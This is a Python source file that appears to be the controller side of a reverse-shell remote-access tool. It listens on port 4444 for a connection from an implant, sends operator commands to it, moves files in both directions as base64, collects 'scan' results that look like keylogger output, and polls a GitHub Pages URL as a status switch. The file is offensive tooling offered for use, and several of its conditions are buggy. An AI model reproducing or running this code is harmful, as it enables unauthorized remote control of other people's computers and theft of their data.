#!/usr/bin/env python3
from os import stat
import socket
import json
import base64
import sys
import requests
import re
class Listener():
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print ("[*] Listening for incoming connection's")
        self.connection, self.address = listener.accept()
        print("[+] Connection Established at [ %s ]" % str(self.address))

    def json_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.json_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.json_recv()

    def download_file(self, path, content):
        with open(path, "wb") as file:
            decoded_file = base64.b64decode(content)
            file.write(decoded_file)
            return "Downloaded [%s] Successfully ." % path

    def upload_file(self, path):
        with open(path, "rb") as file:
            encoded_file = base64.b64encode(file.read())
            return encoded_file
    def recv_scan_result(self, content):
        scan_result = base64.b64decode(content)
        if "Keyboard" and "Resolve" and "Server" not in scan_result:
            with open("scan_result.txt", "w") as f:
                f.write(scan_result)
                f.close()
        print (scan_result)

    def run(self):
        while True:
            cmd = input("> ")
            cmd = cmd.split(" ")
            try:
                if cmd[0] == "upload":
                    file_content = self.upload_file(cmd[1])
                    cmd.append(file_content)
                result = self.execute_remotely(cmd)
                if cmd[0] == "download" and "[-] Error " not in result:
                    result = self.download_file(cmd[1], result)
                if cmd[0] == "scan":
                    result = self.recv_scan_result(result)
            except Exception:
                result = "[-] Error during command execution."
            print (result)

def get_status():
    s = requests.get('https://poggerpussy.github.io').text
    #status = re.sub(r"<.*?>",'', s)
    if s == "true":
        print(s)
        return True
    return False

while True:
    try:
        if get_status:
            app = Listener("0.0.0.0", 4444)
            app.run()
            print(Listener.connection)
            
    except Exception as e:
        print(e)
        continue
    except KeyboardInterrupt:
        print ("Exiting program")
        sys.exit()

